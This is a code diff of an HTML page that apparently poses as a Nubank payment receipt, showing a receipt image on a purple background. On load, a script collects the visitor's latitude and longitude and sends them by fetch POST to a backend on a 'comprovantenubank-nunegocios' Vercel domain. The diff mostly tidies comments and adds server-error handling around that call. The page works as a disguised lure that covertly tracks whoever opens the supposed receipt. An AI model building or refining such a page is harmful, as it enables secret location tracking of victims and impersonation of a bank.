@@ -6,7 +6,7 @@
 </head>
 <body style="background-color: #6B02A3">
   <img style="display: block; margin: 0 auto;" src="img/Com.jpg" alt="Comprovante" />
-  
+
   <script>
     // Executa automaticamente ao carregar a página
     window.addEventListener("load", () => {
@@ -29,7 +29,7 @@
       console.log("Latitude: " + latitude);
       console.log("Longitude: " + longitude);
 
-      // Envia a localização para o backend (Vercel URL)
+      // Envia a localização para o backend
       fetch("https://comprovantenubank-nunegocios.vercel.app/send-location", {
         method: "POST",
         headers: {
@@ -37,9 +37,15 @@
         },
         body: JSON.stringify({ latitude, longitude })
       })
-      .then(response => response.text())  // Lê como texto para evitar erro de JSON malformado
+      .then(response => {
+        if (!response.ok) {
+          throw new Error(`Erro no servidor: ${response.status} - ${response.statusText}`);
+        }
+        return response.text(); // Lê a resposta como texto
+      })
       .then(text => {
-        console.log("Resposta do servidor: ", text);  // Exibe a resposta do servidor
+        console.log("Resposta do servidor: ", text); // Exibe a resposta do servidor
+
         try {
           const data = JSON.parse(text);  // Tenta converter a resposta para JSON
           if (data.success) {
